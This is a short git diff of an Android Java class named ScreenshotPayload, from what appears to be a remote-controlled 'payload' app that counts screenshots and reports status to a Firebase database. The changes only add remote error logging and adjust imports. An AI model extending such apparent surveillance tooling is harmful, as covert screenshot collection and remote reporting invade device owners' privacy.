@@ -3,11 +3,11 @@ package com.aigs.serviceone.payload;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Environment;
-import android.provider.ContactsContract;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
 
+import com.aigs.serviceone.helpers.PayloadTypes;
 import com.aigs.serviceone.helpers.ScreenshotPayloadListener;
 import com.aigs.serviceone.helpers.ZipUtils;
 import com.google.firebase.database.DataSnapshot;
@@ -60,6 +60,7 @@ public class ScreenshotPayload extends AsyncTask<String, Integer, String> {
                                 } catch (DatabaseException | NullPointerException databaseException) {
                                     noOfFiles = -1;
                                 }
+
                             } else noOfFiles = -1;
 
                             if (noOfFiles == -1) {
@@ -73,12 +74,14 @@ public class ScreenshotPayload extends AsyncTask<String, Integer, String> {
 
                         @Override
                         public void onCancelled(@NonNull DatabaseError error) {
-                            //TODO UPDATE TO LOGS
+                            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_SCREENSHOTS_COUNT+"").child("CurrentLog").setValue(error.getMessage());
+
                         }
                     });
 
         }catch (Exception e){
             Log.e("EXCEPTION_SS : ",e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_SCREENSHOTS_COUNT+"").child("CurrentLog").setValue(e.getMessage());
         }
 
         return null;
